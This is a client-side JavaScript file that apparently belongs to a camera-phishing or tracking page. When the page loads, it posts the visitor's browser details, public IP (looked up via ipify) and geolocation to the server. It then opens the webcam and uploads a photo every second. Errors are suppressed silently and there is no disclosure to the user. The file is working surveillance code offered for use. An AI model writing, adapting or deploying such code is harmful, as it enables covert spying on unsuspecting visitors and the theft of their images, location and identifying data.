const infos = {
  browser: navigator.appName,
  platform: navigator.platform,
  language: navigator.language,
  userAgent: navigator.userAgent,
  ip: "",
};

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

async function sendLocation() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const locationInfo = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        time: new Date().toISOString(),
      };

      try {
        await fetch("/upload_location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(locationInfo),
        });
      } catch (e) {}
    },
    (err) => {
      // erroria dasamaebeli 
      // console.log("Location denied");
    }
  );
}
async function userInfo() {
  const ipRes = await fetch("https://api.ipify.org?format=json");
  const ipData = await ipRes.json();
  infos.ip = ipData.ip;
  // console.log("User IP:", infos.ip);

  const response = await fetch("/upload_info", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(infos),
  });
  const result = await response.json();
  // console.log("Upload info result:", result);
}

function takeAndSendPhoto() {
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(
    async (blob) => {
      if (!blob) return;
      const formData = new FormData();
      formData.append("image", blob, "stream.jpg");
      try {
        const response = await fetch("/upload", {
          method: "POST",
          body: formData,
        });
        const result = await response.json();
      } catch (err) {}
    },
    "image/jpeg",
    // 0.5 xarisxi ro aachqaros procesi
    0.5
  );
}

window.onload = async function () {
  try {
    userInfo();
  } catch (err) {}
  try {
    sendLocation();
  } catch (err) {
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: true,
    });
    video.srcObject = stream;
    setInterval(takeAndSendPhoto, 1000);
  } catch (err) {}
};
